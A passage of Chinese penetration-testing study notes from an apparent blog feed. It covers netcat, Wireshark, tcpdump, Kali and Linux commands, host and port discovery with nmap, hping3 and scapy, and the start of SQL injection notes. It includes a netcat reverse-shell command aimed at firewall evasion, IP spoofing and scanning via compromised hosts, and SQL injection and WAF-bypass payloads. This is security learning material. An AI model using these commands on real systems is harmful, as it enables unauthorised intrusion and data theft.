ip port </p><p>客户端开启远程控制：</p><p>服务器端：nc -lp port</p><p>客户端：nc -nv IP port -c bash </p><p>window上将-c bash 改为-c cmd</p><p>注意事项：服务器防火墙一般会限制外网对内网的访问，但是内网对外网的访问限制可能被忽略。</p><p>​                    内网对外网的访问限制：将DNS服务器单独隔离出来，只开放53端口开放侦听外网，</p><p>​                    主动在客户端开启一个端口，并在服务器上侦听该端口，且把shell交给客户端。这种方式不容易被防火墙拦截。</p><h5 id="NC的缺陷"><a href="#NC的缺陷" class="headerlink" title="NC的缺陷"></a><strong>NC的缺陷</strong></h5><p>缺乏数据加密和身份认证的能力</p><h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a><strong>NCAT</strong></h5><p>nmap工具包中的ncat，设计用于弥补NC的缺陷。</p><p>nc版本太多，参数各不相同，使用起来有困难。</p><p>Ubantu版本没有-c，需要用临时文件去转换bash</p><p>遇到问题查看man命令手册（系统自带软件）</p><p>服务端开启端口：ncat -c bash –allow IP(指定可连接的客户端IP）-vnl port –ssl（防止嗅探者查看到明文信息）</p><p>客户端连接：ncat -nv IP port  –ssl    互相交换指纹是一对一连接，保证安全。</p><h4 id="二、WIRESHARK"><a href="#二、WIRESHARK" class="headerlink" title="二、WIRESHARK"></a>二、WIRESHARK</h4><p><strong>常用功能</strong></p><ul><li>抓包嗅探协议分析</li><li>抓包引擎</li><li>Libpcap9–Linux</li><li>winpcap10-windows</li></ul><p><strong>基本使用方法：</strong></p><p>1、终端输入wireshark，启动</p><p> 2、选择要抓包的网卡。</p><p> 3、打开捕获选项，勾选混杂模式（只抓捕本地信息（网卡绑定的ip地址信息），如果不选择捕获模式则无法获取广播（当前网络中的所有信息）信息）。</p><p>4、选择捕获过滤器,可以选择要抓包的内容，如ip地址 格式 host ip地址或者其他协议。</p><p> 5、停止抓包后保存内容，尽量使用pcap格式。兼容性较好。</p><p> 6、通过分析-显示过滤器对抓包结果进行过滤</p><p><strong>数据包的分层结构</strong></p><ul><li>Arp</li><li>lcmp</li><li>Tcp三次握手</li></ul><p>1.源向目标发送syn包（确认连接）</p><p>2.目标向源发送syn、ack（回应并向源确认）</p><p>3.源向目标发送ack包（回应目标发送的syn）</p><ul><li>Udp</li><li>Dns</li><li>http</li><li>ftp</li></ul><p><strong>数据流</strong></p><ul><li>TCP流</li><li>UDP流</li><li>SSL流</li><li>HTTP流</li></ul><h4 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h4><h5 id="tcpdump——抓包"><a href="#tcpdump——抓包" class="headerlink" title="tcpdump——抓包"></a>tcpdump——抓包</h5><p>​       wireshark是图形化工具，在服务器等没有图形化界面的设备上无法使用，此时tcpdump命令行工具可以代替</p><pre><code>tcpdump -i eth0 -s 0 -w a.cap/b.pcap</code></pre><p>-i 指定抓包接口，-s 指定抓包大小，0为抓取整个包，不指定则默认抓取64字节。-w 将抓到的包保存到某个文件，不指定则实时显示</p><pre><code>tcpdump -r a.cap/b.cap</code></pre><p>-r read读取</p><pre><code>tcpdump -A -r a.cap/b.cap</code></pre><p>-A 使用ascii码表转码显示，不要加在-r后面，不然会报错 -X 使用16进制显示</p><h5 id="tcpdump——抓包筛选器"><a href="#tcpdump——抓包筛选器" class="headerlink" title="tcpdump——抓包筛选器"></a>tcpdump——抓包筛选器</h5><pre><code>tcpdump -i eth0 port 22</code></pre><p>抓以太网0上22端口的包。</p><pre><code>tcpdump -i eth0 tcp port 22</code></pre><p>抓以太网0上22端口的TCP包。 curl -v URL</p><h5 id="tcpdump——显示筛选器"><a href="#tcpdump——显示筛选器" class="headerlink" title="tcpdump——显示筛选器"></a>tcpdump——显示筛选器</h5><pre><code>tcpdump -n -r http.cap | awk &#39;{print $3}&#39; | sort -u</code></pre><p>-n 不对IP进行域名解析  AWK 默认用空格做分割 -u unique去重</p><pre><code>tcpdump -n src host IP -r file.cap/file.pcap</code></pre><p>src host IP 指定来源IP，src–&gt;source</p><pre><code>tcpdump -n dst host IP -r file.cap/file.pcap</code></pre><p>dst destination，指定目标IP</p><pre><code>tcpdump -n udp port 53  -r file.cap/file.pcap</code></pre><p>udp 指定显示的协议  port 53 指定端口</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali linux安装相关知识</title>
      <link href="/2020/03/12/linux-an-zhuang/"/>
      <url>/2020/03/12/linux-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h3 id="kali-linux安装部分相关知识"><a href="#kali-linux安装部分相关知识" class="headerlink" title="kali linux安装部分相关知识"></a>kali linux安装部分相关知识</h3><h4 id="kali安装"><a href="#kali安装" class="headerlink" title="kali安装"></a>kali安装</h4><h5 id="硬盘安装"><a href="#硬盘安装" class="headerlink" title="硬盘安装"></a>硬盘安装</h5><ul><li><p>下载安装镜像</p><p><a href="https://www.kali.org/downloads" target="_blank" rel="noopener">https://www.kali.org/downloads</a></p></li><li><p>验证hash值</p></li><li><p>制作启动光盘</p><p>live</p></li><li><p>制作启动U盘</p></li><li><p>设置BIOS启动顺序</p></li><li><p>启动安装</p></li></ul><h5 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h5><ul><li>虚拟化和Docker</li><li>kali Docker image<ul><li><a href="https://www.kali.org/news/official-kali-linux-docker-images/" target="_blank" rel="noopener">https://www.kali.org/news/official-kali-linux-docker-images/</a></li><li><a href="https://github.com/offensive-security/kali-linux-docker" target="_blank" rel="noopener">https://github.com/offensive-security/kali-linux-docker</a></li></ul></li></ul><h5 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h5><ul><li>官方VM镜像</li><li>vmware workstation</li><li>virtualBox<ul><li>下载、安装、扩展工具、基本使用</li><li>win8系统</li><li>安装kali</li><li>安装tools</li></ul></li></ul><h4 id="熟悉环境"><a href="#熟悉环境" class="headerlink" title="熟悉环境"></a>熟悉环境</h4><ul><li>登录密码</li><li>TOP 10安全工具</li><li>字体调整</li><li>强行终止程序</li><li>文件目录</li><li>共享文件</li></ul><h4 id="常见linux命令"><a href="#常见linux命令" class="headerlink" title="常见linux命令"></a>常见linux命令</h4><p>*<em>chmod *</em>控制文件如何被他人所调用</p><ul><li><p>​    u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</p></li><li><p>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。</p></li><li><p>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。</p><p>数字来表示权限</p></li></ul><p>​    r=4,w=2,x=1</p><ul><li>若要rwx属性则4+2+1=7；</li><li>若要rw-属性则4+2=6；</li><li>若要r-x属性则4+1=5。<ul><li>​    chmod ugo+r test.txt ，chmod a+r file1.txt  #将文件设为所有人皆可读取</li><li>chmod 777 test.txt  #用数字来表示权限</li></ul></li></ul><p><strong>ls</strong> 显示目录下文件 </p><ul><li>-l    列出文件详细信息</li><li>-a   列出当前目录下所有文件及目录，包括隐藏文件</li></ul><p><strong>mkdir</strong> 创建目录</p><ul><li>-p 创建目录，若无父目录，则创建p(parent)</li></ul><p><strong>pwd</strong> 查看当前工作目录</p><p><strong>cp</strong>:复制文件</p><p><strong>cd</strong> #切换目录</p><ul><li>cd ~ #跳到自己的home目录</li></ul><p><strong>touch:</strong>创建空文件</p><p><strong>echo:</strong>创建带有内容的文件</p><p><strong>cat</strong> 查看文件内容</p><ul><li>n 或 –number：由 1 开始对所有输出的行数编号。</li><li>-b 或 –number-nonblank：和 -n 相似，只不过对于空白行不编号。</li><li>-s 或 –squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行。</li><li>-v 或 –show-nonprinting：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外。</li><li>-E 或 –show-ends : 在每行结束处显示 $。</li><li>-T 或 –show-tabs: 将 TAB 字符显示为 ^I。</li><li>-A, –show-all：等价于 -vET。</li><li>-e：等价于”-vE”选项；</li><li>-t：等价于”-vT”选项；</li></ul><p><strong>fInd</strong>  在文件系统中搜索某文件</p><ul><li>​    find / name <em>xxx\</em>.c  #模糊查找目录下的文件<ul><li>​    find /var/log -type f -mtime +7  -ok rm {} \  #查找/var/log目录中更改时间在7日以前的普通文                                                                                    件，并在删除之前询问它们： </li><li>find . -type f -perm 644 -exec ls -l {} \   #查找前目录中文件属主具有读写权限                                                                    </li></ul></li></ul><p><strong>wc</strong> 统计文本中行数、字数、字符数</p><p><strong>grep</strong> 在文本文件中查找某个字符串</p><ul><li>grep “被查找的字符串“ 文件名</li><li>grep  -e “正则表达式“ 文件名</li><li>grep -i  “被查找的字符串” 文件名    #忽略大小写</li></ul><p><strong>pwd</strong> 显示当前目录</p><p><strong>more less</strong> 分页显示文本文件内容</p><p><strong>head tail</strong> 显示文件头、尾内容</p><p><strong>mv</strong> 移动或重命名</p><p><strong>us</strong> #切换管理员目录</p><p><strong>./文件名</strong>  #执行文件</p><p><strong>rm</strong> 文件名 #删除文件</p><p><strong>rm -r</strong> 文件夹名 #删除文件夹</p><h5 id="二、Linux系统管理命令"><a href="#二、Linux系统管理命令" class="headerlink" title="二、Linux系统管理命令"></a>二、Linux系统管理命令</h5><p><strong>chmod</strong>控制文件如何被他人所调用。</p><p><strong>stat</strong>        显示指定文件的详细信息，比ls更详细</p><p><strong>who</strong>        显示在线登陆用户</p><p><strong>whoami</strong>      显示当前操作用户</p><p><strong>hostname</strong>    显示主机名</p><p><strong>uname</strong>      显示系统信息</p><p><strong>top</strong>         动态显示当前耗费资源最多进程信息</p><p><strong>ps</strong>          显示瞬间进程状态 ps -au</p><ul><li>ps -A    #显示进程信息</li><li>ps -u root     #显示root用户进程信息</li><li>ps -aux      # 显示所有包含其他使用者的行程</li></ul><p><strong>du</strong>          查看目录大小 du -h /home带有单位显示目录信息</p><p><strong>df</strong>          查看磁盘大小 df -h 带有单位显示磁盘信息</p><p><strong>ifconfig</strong>      查看网络情况</p><p><strong>ping</strong>         测试网络连通</p><p><strong>netstat</strong>      显示网络状态信息</p><p><strong>clear</strong>        清屏</p><p><strong>alias</strong>        对命令重命名 如：alias showmeit=”ps -aux” ，另外解除使用unaliax showmeit</p><p><strong>kill</strong>         杀死进程，可以先用ps 或 top命令查看进程的id，然后再用kill命令杀死进程。</p><ul><li>kill -9  $(ps -ef | grep hnlinux)  #过滤出hnlinux用户进程</li><li>kill -u hnlinux  #方法二</li><li>kill -KILL 123456+  #强制杀死进程</li></ul><h5 id="三、vim使用"><a href="#三、vim使用" class="headerlink" title="三、vim使用"></a>三、vim使用</h5><p>vim三种模式：命令模式、插入模式、编辑模式。使用ESC或i或：l来切换模式。</p><p>命令模式下：</p><p><strong>q</strong>            退出</p><p><strong>:q!</strong>           强制退出</p><p><strong>:wq</strong>          保存并退出</p><p><strong>:set number</strong>   显示行号</p><p><strong>:set nonumber</strong>  隐藏行号</p><p><strong>/apache</strong>       在文档中查找apache 按n跳到下一个，shift+n上一个</p><p><strong>yyp</strong>          复制光标所在行，并粘贴</p><p>(左移一个字符←)、j(下一行↓)、k(上一行↑)、l(右移一个字符→)</p><h5 id="四、Kali-Linux目录结构（文件系统）"><a href="#四、Kali-Linux目录结构（文件系统）" class="headerlink" title="四、Kali Linux目录结构（文件系统）"></a>四、Kali Linux目录结构（文件系统）</h5><p><strong>bin</strong> 所有用户都可以使用的程序目录</p><p><strong>boot</strong> 引导程序GRUB等的存放目录</p><p><strong>dev</strong> 存放所有的设备目录</p><p><strong>etc</strong> 主要的存放配置文件的目录</p><p><strong>home</strong> 用户主目录 </p><p><strong>lib</strong> 库文件目录</p><p><strong>live-bulid</strong> build自己的kali版本的目录</p><p><strong>media</strong> 默认挂载外接存储的目录</p><p><strong>mnt</strong> 以前的linux常用的挂载目录</p><p><strong>usr</strong> 存放执行程序、共享文件</p><p><strong>var</strong> 存放日志、邮件等经常变化的内容。</p><h5 id="五、文件读写权限"><a href="#五、文件读写权限" class="headerlink" title="五、文件读写权限"></a>五、文件读写权限</h5><p>三种基本权限</p><p><strong>R</strong>      读     数值表示为4</p><p><strong>W</strong>     写     数值表示为2</p><p><strong>X</strong>      可执行  数值表示为1</p><h5 id="六、打包压缩命令"><a href="#六、打包压缩命令" class="headerlink" title="六、打包压缩命令"></a>六、打包压缩命令</h5><p><strong>gzip：</strong></p><ul><li>gzip *            #压缩目录下的所有文件</li><li>gzip -dv *    #解压文件，并列出详细信息</li></ul><p><strong>bzip2：</strong></p><p><strong>tar:</strong>         打包压缩</p><p>   <strong>-c</strong>        归档文件</p><p>   <strong>-x</strong>        压缩文件</p><p>   <strong>-z</strong>        gzip压缩文件</p><p>   <strong>-j</strong>        bzip2压缩文件</p><p>   <strong>-v</strong>        显示压缩或解压缩过程 v(view)</p><p>   <strong>-f</strong>        使用档名</p><p>例：</p><p><strong>tar -cvf /home/abc.tar /home/abc</strong>        只打包，不压缩</p><p><strong>tar -zcvf /home/abc.tar.gz /home/abc</strong>     打包，并用gzip压缩</p><p><strong>tar -jcvf /home/abc.tar.bz2 /home/abc</strong>    打包，并用bzip2压缩</p><p>当然，如果想解压缩，就直接替换上面的命令 tar -cvf / tar -zcvf / tar -jcvf 中的“c” 换成“x” 就可以了。</p><h5 id="七、linux管道"><a href="#七、linux管道" class="headerlink" title="七、linux管道"></a>七、linux管道</h5><p>将一个命令的标准输出作为另一个命令的标准输入</p><p>例：grep -r “close” /home/* | more    在home目录下所有文件中查找，包括close的文件，并分页输出。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——主动信息收集</title>
      <link href="/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/"/>
      <url>/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="主动信息收集部分"><a href="#主动信息收集部分" class="headerlink" title="主动信息收集部分"></a>主动信息收集部分</h3><h4 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h4><ul><li><p>直接与目标主机交互</p></li><li><p>无法避免留下发文的痕迹；</p></li><li><p>使用受控的第三方电脑进行探测；</p></li><li><p>使用代理或者已经被控制的主机</p></li><li><p>做好被封杀的准备</p></li><li><p>使用噪音迷惑目标，淹没真实的探测流量</p></li><li><p>扫描-发送不同的探测，根据返回结果判断目标状态</p></li></ul><h4 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h4><ul><li>识别活着的主机</li><li>潜在的被攻击目标</li><li>输出一个IP地址列表</li><li>网络2、3、4层发现</li></ul><p>包括ARP、IPv4、IPv6、ICMP、IPSec、TCP、UDP</p><h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><p>优点：扫描速度快，可靠</p><p>缺点：不可路由</p><h5 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h5><ul><li><p>抓包</p></li><li><p>arping 1.1.1.1 -c 1</p></li><li><p>arping 1.1.1.1 -d</p><p>发现重复响应，不同mac地址拥有相同的IP时，退出返回1</p><p> arp地址欺骗：在你的网络里有另外一个IP地址，声称自己是网关IP，发给网关的数据包就会发给欺骗的主机，该主机的所有者就可以在其机器上抓包，实现中间人攻击，嗅探甚至修改通过该主机传输的数据包，窃取密码，篡改数据，实现一些恶意攻击。</p></li><li><p>arping -c 1.1.1.1 grep “bytes from”|cut -d “ “ -f 5|cut -d “(“ -f 2 |cut -d “)” -f 1</p></li><li><p>脚本：</p><p>arping1.sh eth0&gt;addrs</p></li></ul><p>​       arping2.sh addrs    </p><h5 id="nmap二层发现"><a href="#nmap二层发现" class="headerlink" title="nmap二层发现"></a>nmap二层发现</h5><ul><li>nmap 1.1.1.1-254 -sn</li><li>nmap 1.1.1.1/24 -sn</li></ul><p>​          -sn ping扫描，禁用端口扫描</p><ul><li>​    nmap -iL iplist.txt -sn （扫描文件内IP，类似arping2.sh功能）</li></ul><h5 id="Netdiscover–二层发现"><a href="#Netdiscover–二层发现" class="headerlink" title="Netdiscover–二层发现"></a>Netdiscover–二层发现</h5><ol><li>专用于二层发现</li><li>可用于无线和交换网络环境</li><li>主动和被动探测</li></ol><p><strong>主动</strong></p><p>netdiscover -i eth0 -r 192.168.1/24</p><p>netdiscover -i iplist.txt</p><p><strong>被动</strong></p><p>netdiscover -p  #将本地网卡赋值为混杂模式，非本网卡的数据包也会被侦听到</p><p>主动arp容易触发报警</p><h5 id="Scapy-二层发现"><a href="#Scapy-二层发现" class="headerlink" title="Scapy-二层发现"></a>Scapy-二层发现</h5><p>•作为Python库进行调用</p><p>•也可作为单独的工具使用</p><p>•抓包、分析、创建、修改、注入网络流量</p><p>• apt-get install python-gnuplot #安装python-gnuplot组件</p><p>• Scapy  #启动Scapy</p><h4 id="发现-三层发现"><a href="#发现-三层发现" class="headerlink" title="发现-三层发现"></a>发现-三层发现</h4><p>IP,icmp协议  网络控制管理层</p><p>路径发现，主机网络通断的诊断</p><p>优点：可路由，速度快。</p><p>缺点：速度比二层慢，经常被边界防火墙过滤。</p><h5 id="ping-icmp"><a href="#ping-icmp" class="headerlink" title="ping(icmp)"></a>ping(icmp)</h5><ul><li>ping 192.168.1.1 -c 2（设置发包的数量）</li><li>路由追踪：traceroute <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a></li><li>ping -R 192.168.1.1</li><li>ping 192.168.1.1 -c 1 | grep “bytes from”|cut -d “” -f 4 | cut -d “.” -f 1</li></ul><h5 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h5><p>OSI多层堆叠手工声称ICMP包-IP/icmp</p><ul><li>i=Ip()</li><li>i.dst=”192.168.1.1”（目标IP地址）</li><li>p=ICMP()</li><li>a=str(i/p)</li><li>a.display()</li></ul><h5 id="Nmap——三层发现"><a href="#Nmap——三层发现" class="headerlink" title="Nmap——三层发现"></a>Nmap——三层发现</h5><p>nmap -sn 192.168.1/24  (-sn在同一网段，用arp，不同网段，用ICMP)</p><h5 id="fping-——三层发现"><a href="#fping-——三层发现" class="headerlink" title="fping ——三层发现"></a>fping ——三层发现</h5><ul><li>fping 1.1.1.1 -c 1 （会显示包大小、响应时间、丢包率）</li><li>fping -g 1.1.1.1  1.1.1.2(起始参数 结束参数)</li><li>fping -g 1.1.1.0/24</li><li>fping -f iplist.txt</li></ul><h5 id="hping——三层发现"><a href="#hping——三层发现" class="headerlink" title="hping——三层发现"></a>hping——三层发现</h5><ul><li>Hping(功能强大)</li><li>能够发送几乎任意TCP/IP包</li><li>功能强大但每次只能扫描一个目标</li><li>hping3 192.168.1.1 –icmp -c 5(发5个ping包)</li><li>for addr in $(seq 1 254); do hping3 192.168.1.$addr –icmp -c 5 &gt;&gt; handle.txt &amp; done</li></ul><h4 id="发现——四层扫描"><a href="#发现——四层扫描" class="headerlink" title="发现——四层扫描"></a>发现——四层扫描</h4><p>优点</p><ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以发现所有端口都被过滤的主机</li></ul><p>缺点</p><ul><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul><p>TCP(三次握手)</p><p>未经请求的ACK-RST（非正常通信：目标在线）</p><p>SYN-SYN/ACK、RST(正常通信：目标在线)</p><p>UDP</p><p>目标IP不在线，无响应，目标IP在线、探测的端口也是开放状态，目标主机不会回复；只有一种情况可以探测：我发向目标IP一个没有开放的端口，对方回复一个ICNP端口不可达、一去不复返。</p><p>ACK—Tcp  Port—-RST(如果返回rst则在线)</p><p>scapy：</p><p>\1. i=IP()</p><p>\2. t=TCP()</p><p>3.r=(i/t)</p><p>4.r[tcp].flags=’A’（表示发ack包）</p><p>r[IP].dst=”1.1.1.1”</p><p>a=sr1(r)</p><p>a.display()(查看返回的包)</p><p>a=sr1(IP(dst=”1.1.1.1”)/TCP(dport=80,flags=’A’),timeout=1)</p><p>UDP—–UDP Port—–icmp</p><p>1.u=UDP()</p><p>2.u.deport=33333</p><p>3.r=(i/u)</p><p>4.a=sr1(r.timeout=1,verbose=1)</p><p>5.a.display()</p><p>6.a=sr1(r)</p><p>port-unreachable(目标端口不可达)</p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h5><p>str1(dst=”192.168.1.1”/TCP(dport=80),timeout=1,verbose=1)</p><p>操作系统莫名接受一个syn/ack包，会自动给目标服务器回复一个rst包</p><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>nmap -sS 1.1.1.1 -p 80,21,25,443</p><p>可以不加-sS 默认是-sS</p><p>-p 1-100 扫描1到100</p><p>-p 全扫描</p><p>–open 只显示open的端口</p><p>nmap -sS -iL test.txt -p 80</p><h5 id="hping3"><a href="#hping3" class="headerlink" title="hping3:"></a>hping3:</h5><p>hping3 1.1.1.1 –scan 80,21,25 -S</p><p>hping3 1.1.1.1 –scan 0-65535 -S</p><p>hping3 -c 10 -S –spoof 192.168.1.140 -p ++1 192.168.1.1</p><p>-c 发包数量 –spoof欺骗伪造成另一个IP</p><p>++1端口号每次+1</p><h5 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a>全连接端口扫描</h5><p>全连接对scapy比较困难</p><p>特殊情况下隐蔽扫描无法准确检测</p><p>把操作系统返回的rst包被iptable过滤掉,建立完整的连接</p><p>iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.1.134 -j DROP</p><p>-d 目标ip</p><p>scapy脚本</p><p><strong>nmap:</strong></p><p>nmap -sT 1.1.1.1 -p 80,21</p><p>nmap -sT 1.1.1.1 -p 80-2000</p><p>nmap -sT -iL test.txt -p 80</p><p>不加-p 默认1000个常用端口</p><p><strong>dmitry:</strong></p><p>功能简单,但使用简便,默认150个做常用端口</p><p>dmitry -p 1.1.1.1  //tcp扫描</p><p>dmitry -p 1.1.1.1 -o output</p><p>-o 保存到文件</p><p><strong>nc:</strong></p><p>nc -nv -w l -z 1.1.1.1 1-100</p><p>-w 超时时间</p><h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><ul><li><p>识别开发端口上运行的应用</p></li><li><p>识别目标操作系统</p></li><li><p>提高攻击效率</p><ul><li>Banner捕获</li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析</li><li>防火墙识别</li></ul><h5 id="服务扫描——banner"><a href="#服务扫描——banner" class="headerlink" title="服务扫描——banner"></a>服务扫描——banner</h5><ul><li>软件开发商</li><li>软件名称</li><li>服务类型</li><li>版本号</li><li>直接发现已知的漏洞和弱点</li></ul></li><li><p>连接建立后直接获取banner</p></li><li><p>另类服务识别方法</p><ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul><p><strong>Python socket</strong></p><ul><li><p>Socket模块用于连接网络服务</p><pre><code>import socketbangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)bangrab.connect((&quot;1.1.1.1&quot;,21))bangrab.recv(4096)bangrab.close()exit()</code></pre></li><li><p>Banner不允许抓取，recv函数无返回将挂起！</p></li></ul><p><strong>dmitry</strong></p><ul><li><code>dmitry -p 192.168.153.131</code></li><li><code>dmitry -pb 192.168.153.131</code></li></ul><p><strong>nmap</strong></p><p><code>nmap -sT 192.168.153.131 -p 22 --script=banner.nse</code></p><p><strong>amap</strong></p><ul><li><code>amap -B 192.168.153.131 21</code></li><li><code>amap -B 192.168.153.131 1-65535</code></li><li><code>amap -B  192.168.153.131|grep on</code></li></ul><p>banner信息抓取能力有限</p><p>nmap响应特征分析识别服务</p><ul><li>发送系列复杂的探测</li><li>依据响应特征signature</li><li><code>nc  -nv 1.1.1.1 80</code></li><li><code>nmap 1.1.1.1 -p 80 -sV</code></li></ul><h5 id="服务扫描——SNMP"><a href="#服务扫描——SNMP" class="headerlink" title="服务扫描——SNMP"></a>服务扫描——SNMP</h5><ul><li><p>简单网络管理协议</p></li><li><p>Community strings</p></li><li><p>信息查询或重新配置</p><p>识别和绕过防火墙筛选</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入知识点总结+靶场笔记</title>
      <link href="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/"/>
      <url>/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入漏洞学习笔记-靶场总结"><a href="#SQL注入漏洞学习笔记-靶场总结" class="headerlink" title="SQL注入漏洞学习笔记+靶场总结"></a>SQL注入漏洞学习笔记+靶场总结</h2><h4 id="mysql相关知识点"><a href="#mysql相关知识点" class="headerlink" title="mysql相关知识点"></a>mysql相关知识点</h4><h5 id="Mysql-5-x数据结构"><a href="#Mysql-5-x数据结构" class="headerlink" title="Mysql 5.x数据结构"></a><strong>Mysql 5.x数据结构</strong></h5><p>​      在Mysql5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables（表名）、columns(列名或字段名)。</p><p>​     在schemata表中，schema_name字段用来存储数据库名。</p><p>​     在tables表中，table_schema和table_name分别用来存储数据库名和表名。</p><p>​    在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)</p><p>利用Navicat for MySQL查看结构。</p><h5 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a><strong>增删改查</strong></h5><p><strong>SELECT</strong></p><p>SELECT 列名称 FROM 表名称 WHERE 字段1=‘条件</p><p>一’ AND 字段2=‘条件2’</p><p><strong>INSERT</strong></p><p>INSERT INTO table_name(列1…列2) VALUES(值1….值2….)</p><p><strong>UPDATE</strong></p><p>UPDATE 表名称 SET 列名称=新值 WHERE 列名称=某值</p><p><strong>DELETE</strong></p><p>DELETE FROM 表名称 WHERE 列名称=值</p><h5 id="Mysql常用的几种函数："><a href="#Mysql常用的几种函数：" class="headerlink" title="Mysql常用的几种函数："></a><strong>Mysql常用的几种函数：</strong></h5><p>user():查看当前Mysql登录用户名；</p><p>database():查看当前使用Mysql数据库名；</p><p>version():查看当前Mysql版本。</p><p>扩展limit关键字 limit m,n 从m行开始，到m+n行。</p><h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a><strong>注释</strong></h5><ul><li>注释符：在Mysql中常见的注释符表达式：#、–空格、/**/</li><li>/<em>！SQL语句、\</em>/只有Mysql可以识别，常用来绕过WAF。</li></ul><p>例如：select * from articles where id -id ;</p><p>使用内联注释注入：select * from articles where id=-1 /<em>!union\</em>/ /*!select*/ 1,2,3,4</p><h5 id="注入点查找"><a href="#注入点查找" class="headerlink" title="注入点查找"></a>注入点查找</h5><ul><li>and 1=1/and 1=2（整型）</li><li>随机输入(整型)</li><li>-1/+1回显上下页</li><li>单引号（字符型/整型）</li><li>and sleep(5)(判断页面返回时间)</li></ul><h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><p><strong>根据语法：</strong></p><p><strong>1.可联合查询注入：</strong></p><p>注入前提：能使用union , 页面必须有显示位</p><p>注入方法：</p><ul><li>找到注入点并判断闭合字符</li><li>判断数据库类型</li><li>猜解列数，爆显示位</li><li>得到基本信息（如数据库名、数据库版本等）</li><li>猜解表名</li><li>得到列名</li><li>得到列值</li></ul><p><strong>2.报错型注入</strong></p><p>注入前提：页面没有显示位，源码使用了echo mysql_error输出了错误信息</p><p>​                    注入速度快，语句复杂、不能使用group_concat(),只能使用limit依次猜解</p><p>注入方法：</p><ul><li>floor报错注入</li></ul><p>​      select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x;</p><ul><li><p>updatexml报错注入</p></li><li><p>extractvalue报错注入</p></li></ul><p><strong>3.布尔型注入</strong></p><p>注入前提：页面存在注入但是没有显示位且源码没有使用echo mysql_error()输出报错信息。</p><p>注入方法:</p><ul><li>?id=1 and (注入语句) # 根据返回结果是否相同来得到数据</li><li>主要利用了length()、ascii()、substr()得到结果</li></ul><p><strong>4.基于时间延迟注入</strong></p><p>根据页面返回时间的不同来得到数据</p><h5 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h5><p>题目地址：<a href="http://123.206.87.240:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://123.206.87.240:9004/1ndex.php?id=1</a></p><p>做题步骤：检测注入=&gt;了解过滤=&gt;获取数据</p><h5 id="orderby-注入"><a href="#orderby-注入" class="headerlink" title="orderby 注入"></a>orderby 注入</h5><p><code>select username,password FROM  users order by 1 asc;</code></p><p>1.直接加报错注入</p><p>2.Rand()方式</p><p>3.And payload时间盲注方式</p><p>4.其他方式</p><p><strong>5.多语句查询(堆叠查询）</strong></p><p>注入前提：只在MSSQL数据库存在</p><p>注入方法：一个SQL语句后跟分号后再跟一个语句即可执行两个语句。</p><p><strong>根据类型：</strong></p><ul><li>整型</li><li>字符串型</li><li>搜索型</li></ul><h5 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h5><ul><li>GET</li><li>POST</li><li>X-Forward-For</li><li>Cookie</li><li>User-Agent</li></ul><h4 id="SQL注入绕过机制"><a href="#SQL注入绕过机制" class="headerlink" title="SQL注入绕过机制"></a>SQL注入绕过机制</h4><h5 